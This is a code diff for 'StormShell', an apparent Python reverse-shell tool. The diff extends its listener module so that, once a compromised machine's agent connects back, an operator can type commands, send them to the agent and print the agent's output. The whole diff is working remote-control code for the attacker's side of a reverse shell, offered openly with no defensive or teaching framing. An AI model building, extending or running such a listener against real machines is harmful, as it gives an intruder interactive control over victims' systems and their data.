@@ -2,13 +2,19 @@
 StormShell - Listener Module
 
 A lightweight TCP socket listener that accepts incoming reverse shell
-connections. Handles socket setup, binding, and graceful teardown with
-robust error handling for production-grade reliability.
+connections.  After a client connects, the listener enters an interactive
+command loop — sending operator commands to the agent and displaying the
+agent's responses.  Includes robust error handling and graceful teardown.
 """
 
 import socket
 import sys
 import logging
+
+# ---------------------------------------------------------------------------
+# Constants
+# ---------------------------------------------------------------------------
+BUFFER_SIZE = 4096  # Max bytes to receive per recv() call
 
 # ---------------------------------------------------------------------------
 # Logger configuration
@@ -19,8 +25,8 @@ logger = logging.getLogger("stormshell.listener")
 class Listener:
     """
     TCP socket listener that binds to a given host and port, waits for a
-    single inbound connection, logs the remote peer information, and then
-    performs a graceful shutdown of both the client and server sockets.
+    single inbound connection, and then enters an interactive command loop
+    to exchange data with the connected agent.
 
     Attributes:
         host (str):   IP address to bind the listener to.
@@ -122,6 +128,72 @@ class Listener:
             sys.exit(1)
 
     # ------------------------------------------------------------------
+    # Interactive command loop
+    # ------------------------------------------------------------------
+
+    def _interactive_loop(self) -> None:
+        """
+        Enter an interactive command loop after a connection has been
+        established.  The operator types commands which are sent to the
+        agent; the agent's response is then printed to the console.
+
+        Special commands:
+            exit  — Send a shutdown signal to the agent and break out of
+                    the loop, triggering a graceful teardown.
+        """
+        print("[*] Interactive session started. Type 'exit' to quit.\n")
+        logger.info("Interactive command loop started.")
+
+        while True:
+            try:
+                command = input("StormShell> ").strip()
+            except (EOFError, KeyboardInterrupt):
+                # Operator pressed Ctrl+C or Ctrl+D at the prompt.
+                print("\n[!] Interrupt received. Ending session …")
+                logger.warning("Operator interrupted the command prompt.")
+                # Attempt to notify the agent before exiting.
+                try:
+                    self.client.sendall(b"exit")
+                except OSError:
+                    pass
+                break
+
+            # Ignore empty input — just re-display the prompt.
+            if not command:
+                continue
+
+            # --- Send the command to the agent ---
+            try:
+                self.client.sendall(command.encode("utf-8"))
+                logger.debug("Sent command: %s", command)
+            except (BrokenPipeError, ConnectionResetError, OSError) as exc:
+                print(f"[!] Failed to send command — {exc}")
+                logger.error("Send failed — %s", exc)
+                break
+
+            # If the operator typed 'exit', stop after sending it.
+            if command.lower() == "exit":
+                print("[*] Exit command sent. Closing session …")
+                logger.info("Exit command sent to agent.")
+                break
+
+            # --- Receive the agent's response ---
+            try:
+                response = self.client.recv(BUFFER_SIZE)
+                if not response:
+                    # Empty response means the agent disconnected.
+                    print("[!] Agent disconnected.")
+                    logger.warning("Agent sent empty response (disconnected).")
+                    break
+                print(response.decode("utf-8", errors="replace"))
+            except (ConnectionResetError, OSError) as exc:
+                print(f"[!] Connection lost — {exc}")
+                logger.error("Receive failed — %s", exc)
+                break
+
+        logger.info("Interactive command loop ended.")
+
+    # ------------------------------------------------------------------
     # Cleanup helpers
     # ------------------------------------------------------------------
 
@@ -163,17 +235,13 @@ class Listener:
     def start(self) -> None:
         """
         Full listener lifecycle: create → bind → listen → accept one
-        connection → display remote peer info → graceful shutdown.
+        connection → interactive command loop → graceful shutdown.
         """
         try:
             self._create_server_socket()
             self._bind_and_listen()
             self._accept_connection()
-
-            # At this stage we do not yet have an interactive shell loop,
-            # so we simply acknowledge the connection and shut down cleanly.
-            print("[*] No interactive session available yet. Closing connection.")
-            logger.info("Shutting down — interactive session not implemented yet.")
+            self._interactive_loop()
 
         except KeyboardInterrupt:
             print("\n[!] Keyboard interrupt received. Shutting down …")
